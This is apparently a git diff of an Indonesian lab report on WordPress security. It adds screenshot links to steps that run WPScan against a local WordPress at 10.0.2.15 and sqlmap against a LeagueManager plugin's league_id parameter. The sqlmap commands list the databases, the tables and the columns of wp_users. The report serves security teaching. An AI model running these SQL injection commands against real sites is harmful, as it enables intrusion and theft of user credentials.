@@ -79,7 +79,9 @@ sudo systemctl start apache2
 1. Update terlebih dahulu database WPScan dengan perintah `ruby wpscan.rb --update`.
 2. Jalankan perintah `wpscan -u [alamat_wordpress] --enumerate vp`, contoh: `ruby wpscan.rb --u http://localhost/ --enumerate vp`. alamat localhost ; 10.0.2.15
 3. Output :
-4. ### tambah gambar yo
+![hasil_WPScan1](Hasil%20WPScan/wpscan1.png)
+![hasil_WPScan2](Hasil%20WPScan/wpscan2.png)
+![hasil_WPScan3](Hasil%20WPScan/wpscan3.png)
 
 
 
@@ -88,18 +90,19 @@ sudo systemctl start apache2
 2. Buka halaman plugin leaguemanager http://10.0.2.15/wp-admin/admin.php?page=leaguemanager.
 3. Isi nama league kemudian klik tambah
 4. Masuk ke terminal dan jalankan perintah `sqlmap -u "http://10.0.2.15/wp-admin/admin.php?league_id=2" --dbs `. Perintah ini digunakan untuk mencari tahu database apa yang digunakan.
-5. ### tambah gambar yo
 5. hasil output : 
-6. ### tambah gambar yo
-7. Untuk mengetahui tabel apa saja yang ada dalamnya jalankan perintah `sqlmap -u "http://10.0.2.15/wp-admin/admin.php?league_id=2" --dbms mysql --table`
-8. ### tambah gambar yo
-9. hasil output :
-10. ### tambah gambar yo
-11. Untuk mengetahui colom apa saja yang ada di tabel wp-users database wordpress dengan menjalankan perintah `sqlmap -u "http://10.0.2.15/wp-admin/admin.php?league_id=2" --dbms mysql --columns -D wordpress -T wp_users`
-12.  ### tambah gambar yo
-13.  hasil output : 
-14.  ### tambah gambar yo
-
+![sqlmap1](Hasil%20sqlmap/sqlmap%20cek%20database%201.png)
+![sqlmap2](Hasil%20sqlmap/sqlmap%20cek%20database%202.png)
+6. Untuk mengetahui tabel apa saja yang ada dalamnya jalankan perintah `sqlmap -u "http://10.0.2.15/wp-admin/admin.php?league_id=2" --dbms mysql --table`
+7. hasil output :
+![sqlmap3](Hasil%20sqlmap/sqlmap%20melihat%20isi%20tabel%201.png)
+![sqlmap4](Hasil%20sqlmap/sqlmap%20melihat%20isi%20tabel%202.png)
+![sqlmap5](Hasil%20sqlmap/sqlmap%20melihat%20isi%20tabel%203.png)
+![sqlmap6](Hasil%20sqlmap/sqlmap%20melihat%20isi%20tabel%204.png)
+8. Untuk mengetahui colom apa saja yang ada di tabel wp-users database wordpress dengan menjalankan perintah `sqlmap -u "http://10.0.2.15/wp-admin/admin.php?league_id=2" --dbms mysql --columns -D wordpress -T wp_users`
+9.  hasil output : 
+![league](Hasil%20sqlmap/sqlmap%20mencari%20isi%20kolom%20tabel%20wp_user%201.png)
+![league2](Hasil%20sqlmap/sqlmap%20mencari%20isi%20kolom%20tabel%20wp_user%202.png)
 
 ## Kesimpulan dan Saran
 1. Tools WPScan dapat mengetahui celah keamanan wordpress yang dapat di tembus
